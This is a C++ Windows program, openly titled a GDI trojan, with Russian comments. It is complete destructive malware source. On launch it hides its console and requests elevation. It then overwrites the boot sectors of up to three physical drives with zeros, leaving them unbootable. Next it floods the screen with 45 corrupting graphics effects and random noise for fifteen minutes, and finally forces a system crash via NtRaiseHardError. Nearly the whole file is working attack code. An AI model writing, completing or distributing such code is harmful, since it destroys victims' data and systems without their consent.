// gdi_trojan_ultimate.cpp
#define _WIN32_WINNT 0x0601
#define WINVER 0x0601

#include <windows.h>
#include <winuser.h>
#include <math.h>
#include <mmsystem.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <vector>
#include <thread>
#include <chrono>
#include <algorithm>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "msimg32.lib")

using namespace std;

// ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
int screenWidth = 0;
int screenHeight = 0;
bool isRunning = true;
HINSTANCE hInst;

// ==================== ПРОТОТИПЫ ====================
bool IsAdmin();
void RunAsAdmin();
void OverwriteMBR();
void GenerateSound(int freq, int duration);
void PlayRandomSounds();
void TriggerBSOD();
void RunGDIEffects();

// ==================== ВСЕ ЭФФЕКТЫ (45 штук) ====================

// 1. Шум
void Effect1(HDC hdc, int w, int h) {
    int size = w * h;
    COLORREF* pixels = new COLORREF[size];
    for (int i = 0; i < size; i++) {
        pixels[i] = RGB(rand() % 255, rand() % 255, rand() % 255);
    }
    HBITMAP bmp = CreateBitmap(w, h, 1, 32, pixels);
    HDC mdc = CreateCompatibleDC(hdc);
    SelectObject(mdc, bmp);
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
    delete[] pixels;
}

// 2. Вертикальные полосы
void Effect2(HDC hdc, int w, int h) {
    for (int x = 0; x < w; x += 3) {
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        MoveToEx(hdc, x, 0, NULL);
        LineTo(hdc, x, h);
        DeleteObject(pen);
    }
}

// 3. Круги
void Effect3(HDC hdc, int w, int h) {
    for (int i = 0; i < 50; i++) {
        int cx = rand() % w;
        int cy = rand() % h;
        int rad = 5 + rand() % 100;
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        SelectObject(hdc, brush);
        Ellipse(hdc, cx - rad, cy - rad, cx + rad, cy + rad);
        DeleteObject(pen);
        DeleteObject(brush);
    }
}

// 4. Инверсия
void Effect4(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, NOTSRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 5. Сдвиг
void Effect5(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    int shiftX = rand() % 40 - 20;
    int shiftY = rand() % 40 - 20;
    BitBlt(hdc, shiftX, shiftY, w, h, mdc, 0, 0, SRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 6. Квадраты
void Effect6(HDC hdc, int w, int h) {
    for (int i = 0; i < 40; i++) {
        int x = rand() % w;
        int y = rand() % h;
        int size = 10 + rand() % 100;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Rectangle(hdc, x, y, x + size, y + size);
        DeleteObject(brush);
    }
}

// 7. Линии к центру
void Effect7(HDC hdc, int w, int h) {
    int cx = w / 2;
    int cy = h / 2;
    for (int i = 0; i < 150; i++) {
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        MoveToEx(hdc, rand() % w, rand() % h, NULL);
        LineTo(hdc, cx + rand() % 200 - 100, cy + rand() % 200 - 100);
        DeleteObject(pen);
    }
}

// 8. Спираль
void Effect8(HDC hdc, int w, int h) {
    int cx = w / 2, cy = h / 2;
    int radius = 0;
    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, pen);
    MoveToEx(hdc, cx, cy, NULL);
    for (int i = 0; i < 150; i++) {
        double angle = i * 0.15;
        radius += 2;
        int x = cx + (int)(radius * cos(angle));
        int y = cy + (int)(radius * sin(angle));
        LineTo(hdc, x, y);
    }
    DeleteObject(pen);
}

// 9. Звезды
void Effect9(HDC hdc, int w, int h) {
    for (int i = 0; i < 40; i++) {
        int x = rand() % w;
        int y = rand() % h;
        int size = 5 + rand() % 25;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        POINT pts[10];
        for (int j = 0; j < 10; j++) {
            double angle = j * 3.14159 / 5 - 3.14159 / 2;
            int r = (j % 2 == 0) ? size : size / 2;
            pts[j].x = x + (int)(r * cos(angle));
            pts[j].y = y + (int)(r * sin(angle));
        }
        Polygon(hdc, pts, 10);
        DeleteObject(brush);
    }
}

// 10. Заливка
void Effect10(HDC hdc, int w, int h) {
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    Rectangle(hdc, 0, 0, w, h);
    DeleteObject(brush);
}

// 11. Эллипсы
void Effect11(HDC hdc, int w, int h) {
    for (int i = 0; i < 60; i++) {
        int x1 = rand() % w;
        int y1 = rand() % h;
        int x2 = rand() % w;
        int y2 = rand() % h;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Ellipse(hdc, min(x1, x2), min(y1, y2), max(x1, x2), max(y1, y2));
        DeleteObject(brush);
    }
}

// 12. Градиент
void Effect12(HDC hdc, int w, int h) {
    for (int y = 0; y < h; y += 2) {
        HBRUSH brush = CreateSolidBrush(RGB((y * 255) / h, rand() % 255, rand() % 255));
        RECT rect = {0, y, w, y + 2};
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
    }
}

// 13. Линии
void Effect13(HDC hdc, int w, int h) {
    for (int i = 0; i < 300; i++) {
        HPEN pen = CreatePen(PS_SOLID, rand() % 4 + 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        MoveToEx(hdc, rand() % w, rand() % h, NULL);
        LineTo(hdc, rand() % w, rand() % h);
        DeleteObject(pen);
    }
}

// 14. Арки
void Effect14(HDC hdc, int w, int h) {
    for (int i = 0; i < 40; i++) {
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        DeleteObject(pen);
    }
}

// 15. Сетка
void Effect15(HDC hdc, int w, int h) {
    for (int x = 0; x < w; x += 15 + rand() % 30) {
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        MoveToEx(hdc, x, 0, NULL);
        LineTo(hdc, x, h);
        DeleteObject(pen);
    }
    for (int y = 0; y < h; y += 15 + rand() % 30) {
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        MoveToEx(hdc, 0, y, NULL);
        LineTo(hdc, w, y);
        DeleteObject(pen);
    }
}

// 16. Прямоугольники
void Effect16(HDC hdc, int w, int h) {
    for (int i = 0; i < 50; i++) {
        int x1 = rand() % w;
        int y1 = rand() % h;
        int x2 = rand() % w;
        int y2 = rand() % h;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Rectangle(hdc, min(x1, x2), min(y1, y2), max(x1, x2), max(y1, y2));
        DeleteObject(brush);
    }
}

// 17. Точки
void Effect17(HDC hdc, int w, int h) {
    for (int i = 0; i < 1500; i++) {
        SetPixel(hdc, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
    }
}

// 18. Треугольники
void Effect18(HDC hdc, int w, int h) {
    for (int i = 0; i < 40; i++) {
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        POINT pts[3];
        pts[0].x = rand() % w;
        pts[0].y = rand() % h;
        pts[1].x = rand() % w;
        pts[1].y = rand() % h;
        pts[2].x = rand() % w;
        pts[2].y = rand() % h;
        Polygon(hdc, pts, 3);
        DeleteObject(brush);
    }
}

// 19. Диагонали
void Effect19(HDC hdc, int w, int h) {
    for (int i = 0; i < 150; i++) {
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        int x = rand() % w;
        int y = rand() % h;
        MoveToEx(hdc, x, y, NULL);
        LineTo(hdc, x + rand() % 300 - 150, y + rand() % 300 - 150);
        DeleteObject(pen);
    }
}

// 20. Концентрические круги
void Effect20(HDC hdc, int w, int h) {
    int cx = w / 2, cy = h / 2;
    for (int rad = 10; rad < w / 2; rad += 15) {
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        Ellipse(hdc, cx - rad, cy - rad, cx + rad, cy + rad);
        DeleteObject(pen);
    }
}

// 21. Волны
void Effect21(HDC hdc, int w, int h) {
    static int phase = 0;
    phase += 2;
    for (int x = 0; x < w; x += 2) {
        int y = h / 2 + (int)(50 * sin(x * 0.02 + phase * 0.1));
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        MoveToEx(hdc, x, y - 50, NULL);
        LineTo(hdc, x, y + 50);
        DeleteObject(pen);
    }
}

// 22. Снегопад
void Effect22(HDC hdc, int w, int h) {
    static vector<pair<int,int>> snow;
    if (snow.empty()) {
        for (int i = 0; i < 500; i++) {
            snow.push_back({rand() % w, rand() % h});
        }
    }
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    for (auto& p : snow) {
        p.second += 2 + rand() % 3;
        if (p.second > h) p.second = 0;
        SetPixel(mdc, p.first, p.second, RGB(255, 255, 255));
        SetPixel(mdc, p.first + 1, p.second, RGB(200, 200, 255));
    }
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 23. Блоки
void Effect23(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    
    int blockSize = 20 + rand() % 60;
    for (int x = 0; x < w; x += blockSize) {
        for (int y = 0; y < h; y += blockSize) {
            int dx = rand() % 30 - 15;
            int dy = rand() % 30 - 15;
            BitBlt(hdc, x + dx, y + dy, blockSize, blockSize, mdc, x, y, SRCCOPY);
        }
    }
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 24. Мозаика
void Effect24(HDC hdc, int w, int h) {
    int blockSize = 15 + rand() % 40;
    for (int x = 0; x < w; x += blockSize) {
        for (int y = 0; y < h; y += blockSize) {
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            Rectangle(hdc, x, y, x + blockSize, y + blockSize);
            DeleteObject(brush);
        }
    }
}

// 25. Радуга
void Effect25(HDC hdc, int w, int h) {
    static int hue = 0;
    hue += 2;
    for (int x = 0; x < w; x++) {
        int color = (hue + x * 360 / w) % 360;
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(
            (int)(128 + 127 * sin(color * 3.14159 / 180)),
            (int)(128 + 127 * sin((color + 120) * 3.14159 / 180)),
            (int)(128 + 127 * sin((color + 240) * 3.14159 / 180))
        ));
        SelectObject(hdc, pen);
        MoveToEx(hdc, x, 0, NULL);
        LineTo(hdc, x, h);
        DeleteObject(pen);
    }
}

// 26. Vertical Wide (из твоих файлов) - растягивание по вертикали
void Effect26(HDC hdc, int w, int h) {
    StretchBlt(hdc, 0, -20, w, h + 40, hdc, 0, 0, w, h, SRCCOPY);
}

// 27. Wide (из твоих файлов) - растягивание по горизонтали
void Effect27(HDC hdc, int w, int h) {
    StretchBlt(hdc, -20, 0, w + 40, h, hdc, 0, 0, w, h, SRCCOPY);
}

// 28. Sine Waves (из твоих файлов)
void Effect28(HDC hdc, int w, int h) {
    static double angle = 0;
    angle += 0.05;
    for (float i = 0; i < w + h; i += 0.99f) {
        int a = (int)(sin(angle) * 20);
        BitBlt(hdc, 0, (int)i, w, 1, hdc, a, (int)i, SRCCOPY);
        angle += 3.14159 / 40;
    }
}

// 29. Smelt (из твоих файлов) - плавление
void Effect29(HDC hdc, int w, int h) {
    int rx = rand() % w;
    BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
}

// 30. Train (из твоих файлов) - поезд
void Effect30(HDC hdc, int w, int h) {
    BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
}

// 31. Train2 (из твоих файлов) - поезд вертикальный
void Effect31(HDC hdc, int w, int h) {
    BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
}

// 32. Shake (из твоих файлов) - тряска
void Effect32(HDC hdc, int w, int h) {
    BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
}

// 33. Darkr (из твоих файлов) - затемнение
void Effect33(HDC hdc, int w, int h) {
    BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
}

// 34. GDI Hell (из твоих файлов)
void Effect34(HDC hdc, int w, int h) {
    BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
}

// 35. Bouncing Circles (из твоих файлов)
void Effect35(HDC hdc, int w, int h) {
    static int x = 10, y = 10, signX = 1, signY = 1;
    x += 10 * signX;
    y += 10 * signY;
    if (y >= h) signY = -1;
    if (x >= w) signX = -1;
    if (y <= 0) signY = 1;
    if (x <= 0) signX = 1;
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    Ellipse(hdc, x, y, x + 100, y + 100);
    DeleteObject(brush);
}

// 36. Cubes (из твоих файлов)
void Effect36(HDC hdc, int w, int h) {
    StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);
    StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY);
}

// 37. RGB Shader (из твоих файлов)
void Effect37(HDC hdc, int w, int h) {
    static int c = 0;
    c++;
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    for (int i = 0; i < w * h; i++) {
        int x = i % w, y = i / w;
        SetPixel(mdc, x, y, RGB((x + c) % 255, (y + c) % 255, (x ^ y + c) % 255));
    }
    BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 38. Melt (из твоих файлов)
void Effect38(HDC hdc, int w, int h) {
    int rx = rand() % w;
    BitBlt(hdc, rx, 1, 10, h, hdc, rx, 0, SRCCOPY);
}

// 39. Inverse Melt (из твоих файлов)
void Effect39(HDC hdc, int w, int h) {
    int rx = rand() % w;
    BitBlt(hdc, rx, 1, 10, h, hdc, rx, 0, NOTSRCCOPY);
}

// 40. Pie (из твоих файлов)
void Effect40(HDC hdc, int w, int h) {
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
    DeleteObject(brush);
}

// 41. PolyBezier (из твоих файлов)
void Effect41(HDC hdc, int w, int h) {
    POINT p[4] = {rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h};
    HPEN pen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, pen);
    PolyBezier(hdc, p, 4);
    DeleteObject(pen);
}

// 42. Triangles (из твоих файлов)
void Effect42(HDC hdc, int w, int h) {
    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, 0, 0));
    HBRUSH brush = CreateSolidBrush(RGB(0, 0, rand() % 255));
    SelectObject(hdc, pen);
    SelectObject(hdc, brush);
    POINT vertices[] = {{rand() % w, rand() % h}, {rand() % w, rand() % h}, {rand() % w, rand() % h}};
    Polygon(hdc, vertices, 3);
    DeleteObject(pen);
    DeleteObject(brush);
}

// 43. PlgBlt (из твоих файлов)
void Effect43(HDC hdc, int w, int h) {
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    POINT pt[3];
    int inc3 = rand() % 700;
    if (rand() % 2) inc3 = -inc3;
    pt[0].x = -inc3;
    pt[0].y = inc3;
    pt[1].x = w - inc3;
    pt[1].y = -inc3;
    pt[2].x = inc3;
    pt[2].y = h - inc3;
    PlgBlt(hdc, pt, mdc, 0, 0, w, h, 0, 0, 0);
    DeleteDC(mdc);
    DeleteObject(bmp);
}

// 44. SetPixel Rainbow (из твоих файлов)
void Effect44(HDC hdc, int w, int h) {
    static int rainbow = 0;
    rainbow = (rainbow + 1) % 360;
    for (int yp = 0; yp < h; yp += 2) {
        for (int xp = 0; xp < w; xp += 2) {
            int color = (rainbow + xp + yp) % 360;
            SetPixel(hdc, xp, yp, RGB(
                (int)(128 + 127 * sin(color * 3.14159 / 180)),
                (int)(128 + 127 * sin((color + 120) * 3.14159 / 180)),
                (int)(128 + 127 * sin((color + 240) * 3.14159 / 180))
            ));
        }
    }
}

// 45. Inv (из твоих файлов) - инверсия паттерном
void Effect45(HDC hdc, int w, int h) {
    PatBlt(hdc, 0, 0, w, h, PATINVERT);
}

// ==================== МАССИВ ВСЕХ ЭФФЕКТОВ ====================
typedef void (*EffectFunc)(HDC, int, int);
EffectFunc effects[] = {
    Effect1, Effect2, Effect3, Effect4, Effect5,
    Effect6, Effect7, Effect8, Effect9, Effect10,
    Effect11, Effect12, Effect13, Effect14, Effect15,
    Effect16, Effect17, Effect18, Effect19, Effect20,
    Effect21, Effect22, Effect23, Effect24, Effect25,
    Effect26, Effect27, Effect28, Effect29, Effect30,
    Effect31, Effect32, Effect33, Effect34, Effect35,
    Effect36, Effect37, Effect38, Effect39, Effect40,
    Effect41, Effect42, Effect43, Effect44, Effect45
};
int numEffects = sizeof(effects) / sizeof(effects[0]);

// ==================== АДМИН ====================
bool IsAdmin() {
    BOOL b = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &b);
        FreeSid(pAdmin);
    }
    return b;
}

void RunAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    SHELLEXECUTEINFOA sei = {sizeof(sei)};
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_HIDE;
    ShellExecuteExA(&sei);
    ExitProcess(0);
}

// ==================== MBR ====================
void OverwriteMBR() {
    for (int drive = 0; drive < 3; drive++) {
        char path[32];
        sprintf(path, "\\\\.\\PhysicalDrive%d", drive);
        HANDLE hDrive = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDrive != INVALID_HANDLE_VALUE) {
            BYTE mbrData[512];
            memset(mbrData, 0x00, 512);
            mbrData[510] = 0x00;
            mbrData[511] = 0x00;
            DWORD bytesWritten = 0;
            WriteFile(hDrive, mbrData, 512, &bytesWritten, NULL);
            SetFilePointer(hDrive, 512, NULL, FILE_BEGIN);
            WriteFile(hDrive, mbrData, 512, &bytesWritten, NULL);
            CloseHandle(hDrive);
        }
    }
}

// ==================== ЗВУК ====================
void GenerateSound(int freq, int duration) {
    if (freq < 20 || freq > 20000) freq = 440;
    if (duration < 10) duration = 10;
    int samples = duration * 44100 / 1000;
    short* buffer = new short[samples];
    for (int i = 0; i < samples; i++) {
        double t = (double)i / 44100.0;
        double wave = sin(2.0 * 3.14159 * freq * t);
        wave += 0.3 * sin(2.0 * 3.14159 * freq * 2.5 * t);
        wave += 0.15 * sin(2.0 * 3.14159 * freq * 0.5 * t);
        buffer[i] = (short)(wave * 16000);
    }
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wf = {WAVE_FORMAT_PCM, 1, 44100, 88200, 2, 16, 0};
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        delete[] buffer;
        return;
    }
    WAVEHDR wh = {0};
    wh.lpData = (LPSTR)buffer;
    wh.dwBufferLength = samples * 2;
    wh.dwFlags = 0;
    waveOutPrepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wh, sizeof(WAVEHDR));
    Sleep(duration + 20);
    waveOutUnprepareHeader(hWaveOut, &wh, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
    delete[] buffer;
}

void PlayRandomSounds() {
    srand(GetTickCount());
    thread soundThread([]() {
        while (isRunning) {
            int freq = 50 + (rand() % 5000);
            int duration = 30 + (rand() % 400);
            GenerateSound(freq, duration);
            Sleep(50 + rand() % 500);
        }
    });
    soundThread.detach();
}

// ==================== BSOD ====================
void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
        if (NtRaiseHardError) {
            NtRaiseHardError(0xC0000022, 0, 0, NULL, 1, NULL);
        }
    }
    volatile int* p = NULL;
    *p = 0xDEADBEEF;
}

// ==================== ЗАПУСК ЭФФЕКТОВ С КОМБИНАЦИЯМИ ====================
void RunGDIEffects() {
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(0);
    if (!hdc) return;
    
    vector<int> effectOrder;
    for (int i = 0; i < numEffects; i++) effectOrder.push_back(i);
    random_shuffle(effectOrder.begin(), effectOrder.end());
    
    time_t startTime = time(NULL);
    time_t endTime = startTime + 15 * 60;
    int effectIndex = 0;
    
    while (time(NULL) < endTime && isRunning) {
        // Случайно выбираем количество эффектов в комбинации (1-4)
        int comboSize = 1 + (rand() % 4);
        
        // Если комбо-режим включён (50% шанс)
        if (rand() % 2 == 0) {
            // Сохраняем текущий экран
            HDC mdc = CreateCompatibleDC(hdc);
            HBITMAP bmp = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
            SelectObject(mdc, bmp);
            BitBlt(mdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
            
            // Применяем несколько эффектов подряд
            for (int i = 0; i < comboSize; i++) {
                int idx = effectOrder[(effectIndex + i) % numEffects];
                effects[idx](hdc, screenWidth, screenHeight);
                
                // Генерируем звук для каждого эффекта
                if (rand() % 3 == 0) {
                    GenerateSound(100 + rand() % 4000, 30 + rand() % 150);
                }
                
                Sleep(20 + rand() % 50);
            }
            
            // Восстанавливаем оригинал с наложением эффектов
            // (комбинируем через XOR или смешивание)
            if (rand() % 3 == 0) {
                // Инверсия комбинации
                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, NOTSRCCOPY);
            } else if (rand() % 2 == 0) {
                // Наложение с прозрачностью
                BLENDFUNCTION bf = {AC_SRC_OVER, 0, 128, 0};
                AlphaBlend(hdc, 0, 0, screenWidth, screenHeight, mdc, 0, 0, screenWidth, screenHeight, bf);
            }
            
            DeleteDC(mdc);
            DeleteObject(bmp);
            
            effectIndex += comboSize;
        } else {
            // Одиночный эффект
            int idx = effectOrder[effectIndex % numEffects];
            effects[idx](hdc, screenWidth, screenHeight);
            
            if (rand() % 3 == 0) {
                GenerateSound(50 + rand() % 6000, 20 + rand() % 200);
            }
            
            effectIndex++;
        }
        
        // Перемешиваем порядок раз в 5-10 эффектов
        if (rand() % 20 == 0) {
            random_shuffle(effectOrder.begin(), effectOrder.end());
        }
        
        Sleep(50 + rand() % 150);
    }
    
    ReleaseDC(0, hdc);
}

// ==================== ТОЧКА ВХОДА ====================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsAdmin()) { RunAsAdmin(); return 0; }
    srand(GetTickCount());
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    OverwriteMBR();
    PlayRandomSounds();
    
    thread gdiThread(RunGDIEffects);
    Sleep(15 * 60 * 1000);
    
    isRunning = false;
    gdiThread.join();
    Sleep(1000);
    TriggerBSOD();
    return 0;
}
